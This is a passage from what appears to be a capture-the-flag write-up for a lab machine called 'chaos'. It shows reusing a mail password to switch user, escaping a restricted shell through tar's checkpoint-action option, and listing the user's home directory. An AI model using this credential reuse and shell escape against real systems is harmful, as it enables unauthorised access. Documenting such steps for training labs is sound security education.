# Shell

We can try the previous credentials used for `ayush mail`.

```bash
$ su ayush
Password: jiujitsu
ayush@chaos:/home$
```

Ayush has a `restricted shell`, but he can run the `tar` command. We can spawn a shell with this command : https://gtfobins.github.io/gtfobins/tar/

```bash
$ ls
rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
$ tar cf /dev/null rick.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Upgrade the `PATH`...

```bash
ayush@chaos:/home$ export PATH=/bin:$PATH
ayush@chaos:/home$ export PATH=/usr/bin:$PATH
ayush@chaos:/home$ id
uid=1001(ayush) gid=1001(ayush) groups=1001(ayush)
```

Looking the `ayush home`, we can find a `.mozilla` directory.

```bash
$ ls -la
total 40
drwx------ 6 ayush ayush 4096 May 16 19:11 .
drwxr-xr-x 4 root  root  4096 Oct 28  2018 ..
drwxr-xr-x 2 root  root  4096 Oct 28  2018 .app
-rw------- 1 root  root     0 Nov 24  2018 .bash_history
-rw-r--r-- 1 ayush ayush  220 Oct 28  2018 .bash_logout
-rwxr-xr-x 1 root  root    22 Oct 28  2018 .bashrc
drwx------ 3 ayush ayush 4096 May 16 19:11 .gnupg
drwx------ 3 ayush ayush 4096 May 16 19:38 mail
drwx------ 4 ayush ayush 4096 Sep 29  2018 .mozilla
-rw-r--r-- 1 ayush ayush  807 Oct 28  2018 .profile
-rw------- 1 ayush ayush   33 Oct 28  2018 user.txt
```
